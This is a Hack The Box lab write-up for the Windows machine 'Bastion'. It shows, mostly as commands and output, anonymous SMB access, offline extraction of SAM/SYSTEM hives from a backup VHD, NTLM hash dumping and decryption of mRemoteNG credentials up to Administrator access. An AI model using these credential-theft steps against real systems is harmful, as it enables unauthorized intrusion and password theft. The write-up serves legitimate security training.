# HTB: Bastion (Easy)

> **Hack The Box Writeup**
>
> **Machine:** Bastion  
> **Difficulty:** Easy  
> **Operating System:** Windows  
> **Date Solved:** 2026-06-01

---

# Executive Summary

| Field | Value |
|---------|---------|
| Machine Name | Bastion |
| OS | Windows |
| Difficulty | Easy |
| Initial Access | SMB Backup Share |
| Credential Access | Offline SAM Extraction |
| User Access | SSH as L4mpje |
| Privilege Escalation | mRemoteNG Credential Recovery |
| Final Access | Administrator |

---

# Attack Path

```text
Reconnaissance
    ↓
SMB Enumeration
    ↓
Accessible Backup Share
    ↓
VHD Discovery
    ↓
Mount Backup Disk
    ↓
Extract SAM & SYSTEM
    ↓
Dump NTLM Hashes
    ↓
Crack Password
    ↓
SSH Access as L4mpje
    ↓
mRemoteNG Configuration Discovery
    ↓
Decrypt Stored Credentials
    ↓
Administrator Access
    ↓
Root Flag
```

---

# 1. Enumeration & Reconnaissance

## Nmap Scan

```bash
sudo nmap -sC -sV -p- -T5 -sS 10.129.136.29
```

### Key Findings

- 22/tcp → SSH
- 445/tcp → SMB
- 5985/tcp → WinRM
- Windows Server 2016

---

# 2. SMB Enumeration

List shares:

```bash
smbclient -N -L 10.129.136.29
```

Interesting share:

```text
Backups
```

Connect:

```bash
smbclient //10.129.136.29/Backups -U ""
```

Contents:

```text
note.txt
WindowsImageBackup
```

The note reveals:

```text
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

---

# 3. Exploring the Backup

Navigate to:

```text
WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351
```

Two VHD files are present:

```text
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

Install requirements:

```bash
sudo apt install cifs-utils
```

Mount the SMB share:

```bash
sudo mkdir /mnt/remote_backup
sudo mount -t cifs -o username=guest,password= //10.129.136.29/Backups /mnt/remote_backup
```

---

# 4. Mounting the VHD

```bash
sudo modprobe nbd max_part=8
```

```bash
sudo qemu-nbd --connect=/dev/nbd0 "/mnt/remote_backup/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd"
```

Inspect partitions:

```bash
sudo fdisk -l /dev/nbd0
```

Mount the filesystem:

```bash
sudo mkdir -p /mnt/vhd_disk
sudo mount -o ro /dev/nbd0p1 /mnt/vhd_disk
```

Extract registry hives:

```bash
cp /mnt/vhd_disk/Windows/System32/config/SAM .
cp /mnt/vhd_disk/Windows/System32/config/SYSTEM .
```

Cleanup:

```bash
sudo umount /mnt/vhd_disk
sudo qemu-nbd --disconnect /dev/nbd0
sudo umount /mnt/remote_backup
```

---

# 5. Extracting Password Hashes

```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```

Output:

```text
Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0
Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0
L4mpje:1000:...:26112010952d963c8dc4217daec986d9
```

Crack the L4mpje hash using CrackStation.

---

# 6. User Access

```bash
ssh L4mpje@10.129.136.29
```

Retrieve the user flag:

```powershell
type Desktop\user.txt
```

---

# 7. Privilege Escalation

mRemoteNG is installed on the host.

Interesting file:

```text
C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml
```

Clone the decryptor:

```bash
git clone https://github.com/kmahyyg/mremoteng-decrypt.git
cd mremoteng-decrypt/
chmod +x mremoteng_decrypt.py
```

Decrypt the stored credential:

```bash
./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtK<SNIP>0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```

Output:

```text
Password: thXL<SNIP>0ER2
```

---

# 8. Administrator Access

Login:

```bash
ssh administrator@10.129.136.29
```

Retrieve the root flag:

```powershell
type Desktop\root.txt
```

---

# Key Findings

| Finding | Impact |
|-----------|-----------|
| Anonymous SMB access | Backup exposure |
| Accessible VHD backups | Offline credential extraction |
| SAM & SYSTEM extraction | NTLM hash recovery |
| Cracked user password | Initial shell access |
| mRemoteNG credential storage | Administrator password recovery |
| Administrator SSH access | Full compromise |

---

# Lessons Learned

- Backup shares often contain highly sensitive data.
- VHD files can be mounted and analyzed offline.
- Registry hives expose credential material when accessible.
- Password managers and remote management tools may store recoverable secrets.
- Sensitive backups should never be exposed to unauthenticated users.

---

# Flags

## User Flag

```powershell
type Desktop\user.txt
```

## Root Flag

```powershell
type Desktop\root.txt
```

---

**Machine:** Bastion
**Difficulty:** Easy
**Status:** Owned
